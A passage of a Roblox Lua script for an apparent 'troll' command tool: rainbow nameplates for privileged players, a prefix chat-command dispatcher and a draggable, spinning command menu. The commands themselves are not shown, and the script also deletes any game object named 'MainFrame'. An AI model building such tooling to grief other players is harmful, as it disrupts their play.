			gradient.Color = ColorSequence.new(color_sequence)
			c = c + 0.08
			
			if c >= math.pi * 2 then
				c = 0
			end
			
			task.wait()
		end
	end)
end

local function setup_nameplate(object)
	if object:IsA("TextLabel") and (object.Name == "user" or object.Text == "user") then
		local parent = object.Parent
		
		while parent do
			if parent:IsA("BillboardGui") and parent.Parent:IsA("Humanoid") then
				local humanoid = parent.Parent
				local character = humanoid.Parent
				local player = players:GetPlayerFromCharacter(character)
				
				if player and get_player_ownership(player) > 0 then
					object.TextColor3 = Color3.new(1, 1, 1)
					object.TextStrokeColor3 = Color3.new(0.4, 0.4, 0.4)
					object.TextStrokeTransparency = 0.2
					object.Font = Enum.Font.GothamBold
					object.Text = get_custom_name(player)
					object.TextSize = 25
					
					parent.Size = UDim2.new(8, 0, 2, 0)
					parent.StudsOffset = Vector3.new(0, 3, 0)
					
					local gradient = Instance.new("UIGradient")
					gradient.Rotation = 90
					gradient.Parent = object
					
					animate_rainbow(object, gradient)
					return
				end
				break
			end
			parent = parent.Parent
		end
	end
end

local function on_message(message, player)
	if message:sub(1, #troll_config.prefix) ~= troll_config.prefix then
		return
	end
	
	local content = message:sub(#troll_config.prefix + 1)
	local parts = {}
	
	for word in content:gmatch("%S+") do
		table.insert(parts, word)
	end
	
	if #parts == 0 then return end
	
	local cmd_name = string.lower(table.remove(parts, 1))
	local cmd = troll_config.commands[cmd_name]
	
	if not cmd then return end
	
	if not can_use_command(player, cmd) then
		return
	end
	
	pcall(cmd.run, table.unpack(parts))
end

local function setup_player_chat(player)
	if get_player_ownership(player) > 0 then
		local connection = player.Chatted:Connect(function(msg)
			on_message(msg, player)
		end)
		
		if not shared.chat_connections then
			shared.chat_connections = {}
		end
		shared.chat_connections[player.UserId] = connection
		
		players.PlayerRemoving:Connect(function(leaving_player)
			if leaving_player == player and shared.chat_connections[player.UserId] then
				shared.chat_connections[player.UserId]:Disconnect()
				shared.chat_connections[player.UserId] = nil
			end
		end)
	end
end

local function create_command_gui()
	local screen_gui = Instance.new("ScreenGui")
	screen_gui.Name = "CommandGui"
	screen_gui.ResetOnSpawn = false
	screen_gui.Parent = player:WaitForChild("PlayerGui")
	
	local user_input_service = game:GetService("UserInputService")
	local is_mobile = user_input_service.TouchEnabled and not user_input_service.MouseEnabled
	
	local gui_width = is_mobile and 200 or 280
	local gui_height = is_mobile and 300 or 380
	
    for _, v in ipairs(game:GetDescendants()) do
        if v.Name == "MainFrame" then
            v:Destroy()
        end
    end
	local main_frame = Instance.new("Frame")
	main_frame.Name = "MainFrame"
	main_frame.Size = UDim2.new(0, gui_width, 0, gui_height)
	main_frame.Position = UDim2.new(0.5, -gui_width / 2, 0.5, -gui_height / 2)
	main_frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	main_frame.BorderSizePixel = 0
	main_frame.Parent = screen_gui
	
	local title = Instance.new("TextLabel")
	title.Name = "Title"
	title.Size = UDim2.new(1, 0, 0, 50)
	title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	title.BorderSizePixel = 0
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.Font = Enum.Font.GothamBold
	title.TextSize = 16
	title.Text = "Commands"
	title.Parent = main_frame
	
	local scroll_frame = Instance.new("ScrollingFrame")
	scroll_frame.Name = "ScrollFrame"
	scroll_frame.Size = UDim2.new(1, -12, 1, -60)
	scroll_frame.Position = UDim2.new(0, 6, 0, 55)
	scroll_frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
	scroll_frame.BorderSizePixel = 0
	scroll_frame.ScrollBarThickness = 6
	scroll_frame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
	scroll_frame.Parent = main_frame
	
	local list_layout = Instance.new("UIListLayout")
	list_layout.Padding = UDim.new(0, 6)
	list_layout.Parent = scroll_frame
	
	local buttons = {}
	local original_sizes = {}
	
	local player_ownership = get_player_ownership(player)
	
	for cmd_name, cmd_data in pairs(troll_config.commands) do
		if player_ownership >= cmd_data.ownership then
            -- old something was gonna happen blah blah who cares
			local cmd_button = Instance.new("TextButton")
			cmd_button.Name = cmd_name
			cmd_button.Size = UDim2.new(1, -6, 0, 35)
			cmd_button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
			cmd_button.TextColor3 = Color3.fromRGB(220, 220, 220)
			cmd_button.Font = Enum.Font.Gotham
			cmd_button.TextSize = 12
			cmd_button.Text = troll_config.prefix .. cmd_name
			cmd_button.BorderSizePixel = 0
			cmd_button.Parent = scroll_frame
			
			table.insert(buttons, cmd_button)
			original_sizes[cmd_button] = UDim2.new(1, -6, 0, 35)
			
			local btn_corner = Instance.new("UICorner")
			btn_corner.CornerRadius = UDim.new(0, 6)
			btn_corner.Parent = cmd_button
			
			cmd_button.MouseEnter:Connect(function()
				local tween_info = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
				local tween = game:GetService("TweenService"):Create(cmd_button, tween_info, {BackgroundColor3 = Color3.fromRGB(170, 100, 200)})
				tween:Play()
				local tween2 = game:GetService("TweenService"):Create(cmd_button, tween_info, {TextColor3 = Color3.fromRGB(255, 255, 255)})
				tween2:Play()
			end)
			
			cmd_button.MouseLeave:Connect(function()
				local tween_info = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
				local tween = game:GetService("TweenService"):Create(cmd_button, tween_info, {BackgroundColor3 = Color3.fromRGB(50, 50, 50)})
				tween:Play()
				local tween2 = game:GetService("TweenService"):Create(cmd_button, tween_info, {TextColor3 = Color3.fromRGB(220, 220, 220)})
				tween2:Play()
			end)
		end
	end
	
	scroll_frame.CanvasSize = UDim2.new(0, 0, 0, list_layout.AbsoluteContentSize.Y + 20)
	list_layout.Changed:Connect(function()
		scroll_frame.CanvasSize = UDim2.new(0, 0, 0, list_layout.AbsoluteContentSize.Y + 20)
	end)
	
	local dragging = false
	local drag_offset_x = 0
	local drag_offset_y = 0
	local velocity_x = 0
	local velocity_y = 0
	local friction = 0.88
	local last_pos = Vector2.new(0, 0)
	
	local function rotate_all_text(rotation)
		title.Rotation = rotation
		for _, button in pairs(scroll_frame:GetChildren()) do
			if button:IsA("TextButton") then
				button.Rotation = rotation
			end
		end
	end
	
	local function clamp_position()
		local parent_size = screen_gui.AbsoluteSize
		local frame_size = main_frame.AbsoluteSize
		local x = main_frame.Position.X.Offset
		local y = main_frame.Position.Y.Offset
		
		if x < 0 then
			main_frame.Position = UDim2.new(0, 0, 0, y)
			velocity_x = -velocity_x * 2.5
		elseif x + frame_size.X > parent_size.X then
			main_frame.Position = UDim2.new(0, parent_size.X - frame_size.X, 0, y)
			velocity_x = -velocity_x * 1.5
		end
		
		if y < 0 then
			main_frame.Position = UDim2.new(0, x, 0, 0)
			velocity_y = -velocity_y * 1.5
		elseif y + frame_size.Y > parent_size.Y then
			main_frame.Position = UDim2.new(0, x, 0, parent_size.Y - frame_size.Y)
			velocity_y = -velocity_y * 2.5
		end
	end
	
	local function randomize_buttons()
		for _, button in pairs(buttons) do
			local random_scale = math.random(80, 120) / 100
			local random_height = 35 * random_scale
			button.Size = UDim2.new(1, -6, 0, random_height)
			button.Rotation = math.random(-15, 15)
		end
	end
	
	local function reset_buttons()
		for _, button in pairs(buttons) do
			local tween_info = TweenInfo.new(0.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out)
			local tween = game:GetService("TweenService"):Create(button, tween_info, {Size = original_sizes[button], Rotation = 0})
			tween:Play()
		end
	end
	
	main_frame.InputBegan:Connect(function(input, processed)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			local mouse_pos = user_input:GetMouseLocation()
			local frame_pos = main_frame.AbsolutePosition
			
			drag_offset_x = mouse_pos.X - frame_pos.X
			drag_offset_y = mouse_pos.Y - frame_pos.Y
			
			last_pos = Vector2.new(main_frame.Position.X.Offset, main_frame.Position.Y.Offset)
			velocity_x = 0
			velocity_y = 0
		end
	end)
	
	user_input.InputChanged:Connect(function(input, processed)
		if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
			local mouse_pos = user_input:GetMouseLocation()
			
			local new_x = mouse_pos.X - drag_offset_x
			local new_y = mouse_pos.Y - drag_offset_y
			
			velocity_x = (new_x - main_frame.Position.X.Offset) * 0.8
			velocity_y = (new_y - main_frame.Position.Y.Offset) * 0.8
			
			main_frame.Position = UDim2.new(0, new_x, 0, new_y)
			clamp_position()
			
			local frame_center = Vector2.new(main_frame.AbsolutePosition.X + main_frame.AbsoluteSize.X / 2, main_frame.AbsolutePosition.Y + main_frame.AbsoluteSize.Y / 2)
			local delta_x = mouse_pos.X - frame_center.X
			local delta_y = mouse_pos.Y - frame_center.Y
			
			local angle = math.atan2(delta_y, delta_x)
			main_frame.Rotation = math.deg(angle) * 6
			rotate_all_text(main_frame.Rotation)
		end
	end)
	
	user_input.InputEnded:Connect(function(input, processed)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = false
			
			task.spawn(function()
				while math.abs(velocity_x) > 0.1 or math.abs(velocity_y) > 0.1 and main_frame.Parent do
					velocity_x = velocity_x * friction
					velocity_y = velocity_y * friction
					
					local new_x = main_frame.Position.X.Offset + velocity_x
					local new_y = main_frame.Position.Y.Offset + velocity_y
					main_frame.Position = UDim2.new(0, new_x, 0, new_y)
					clamp_position()
					
					local target_rotation = 0
					main_frame.Rotation = main_frame.Rotation + (target_rotation - main_frame.Rotation) * 0.12
					rotate_all_text(main_frame.Rotation)
					
					if math.abs(velocity_x) < 0.1 and math.abs(velocity_y) < 0.1 and math.abs(main_frame.Rotation) < 0.3 then
						main_frame.Rotation = 0
						rotate_all_text(0)
						break
					end
					
					task.wait()
				end
				main_frame.Rotation = 0
				rotate_all_text(0)
			end)
		end
	end)
end

local function wfdsxz()
	for _, object in ipairs(game:GetDescendants()) do
		setup_nameplate(object)
	end
	
	game.DescendantAdded:Connect(function(object)
		task.wait(0.01)
		setup_nameplate(object)
	end)
	
	for _, player in pairs(players:GetPlayers()) do
		setup_player_chat(player)
	end
	
	players.PlayerAdded:Connect(function(player)
		setup_player_chat(player)
	end)
	
	if get_player_ownership(player) > 0 then
		create_command_gui()
	end
end

if troll_config.test_mode or get_player_ownership(player) > 0 then
	wfdsxz()
end
